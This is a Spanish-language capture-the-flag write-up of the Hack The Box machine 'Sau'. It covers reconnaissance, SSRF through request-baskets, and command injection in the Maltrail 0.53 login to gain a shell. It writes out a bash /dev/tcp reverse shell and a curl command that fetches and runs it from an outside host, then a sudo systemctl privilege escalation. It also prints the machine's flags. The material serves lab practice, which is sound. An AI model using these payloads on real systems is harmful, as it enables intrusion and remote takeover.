---
title: Sau HTB
date: 2023-07-11
tier: 
author: naibu3
---
## Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.15.193 -v
```
```nmap
PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown
```

Solo vemos dos puertos abiertos, el [[22-ssh]] y el **55555** vamos a lanzar scripts de reconocimiento para tratar de obtener más información:

```nmap
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 13 Jul 2023 12:42:17 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 13 Jul 2023 12:41:47 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 13 Jul 2023 12:41:48 GMT
|_    Content-Length: 0
```

Si buscamos la versión de ssh en [launchpad](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4), vemos que puede tratarse de un **Ubuntu Focal**.

```bash
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.224:55555/ -t 20
```
```gobuster
/admin                (Status: 200) [Size: 0]
/baskets              (Status: 401) [Size: 0]
/test                 (Status: 200) [Size: 0]
/web                  (Status: 200) [Size: 8700]
```

Parece que hay una web en el puerto 55555. Si entramos vemos que se trata de un servicio de *webhooks* que parece utilizar un proyecto de github llamado [requests-baskets](https://github.com/darklynx/request-baskets). Con una búsqueda en internet descubrimos que es vulnerable a [[CSRF]]. Hay un [gist](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3) de github que explica cómo explotarlo.

## Explotación

Para la explotación, debemos hacer la siguiente petición:

```bash
curl --location 'http://10.10.11.224:55555/api/baskets/new' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

Ahora al acceder a la basket (`http://10.10.11.224:55555/api/baskets/new`), nos redirige a otro servicio que solo estaba disponible accediendo desde el servidor en local.

Este servicio se trata de **Maltrail** (v**0.53**), como vemos en la parte inferior. SI hacemos una búsqueda por internet, descubriremos que hay una vulnerabilidad relacionada con el **login**.
Para poder acceder a dicho recurso debemos repetir el proceso anterior:

```bash
curl --location 'http://10.10.11.224:55555/api/baskets/new' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

Si tratamos de acceder a `http://10.10.11.224:55555/api/baskets/new`, nos dará un mensaje de *login-failed*. Ahora ya podemos explotar dicha [vuln]():

```bash
curl 'http://10.10.11.224:55555/new6/login'  --data 'username=;`<command>`'
```

Crearemos un archivo *rev.sh* y trataremos de establecer una [[Reverse shell]]:

```rev.sh
bash -i >& /dev/tcp/10.10.16.53/39393 0>&1
```
```bash
curl 'http://10.10.11.224:55555/new6/login'  --data 'username=;`curl 10.10.16.53/rev.sh | bash`'
```

Y ya estaríamos dentro, podemos aplicar un [[Tratamiento de la tty]]. Somos el usuario **puma** (`46a525e05ef068d9121d0dc72144bcf5`).

## Escalada de privilegios

Si buscamos que archivos podemos ejecutar como *sudo*, encontraremos que podemos ejecutar:

```bash
sudo -l
```
```bash
/usr/bin/systemctl status trail.service
```

Si buscamos en [gtfoBins](https://gtfobins.github.io/gtfobins/systemctl/), vemos que podemos hacernos **root** con:

```bash
sudo /usr/bin/systemctl status trail.service
```
```vim
!sh
```

Y ya hemos resuelto la máquina (`bea514c27e2e6e5731ea9f0dde6f40a0`)!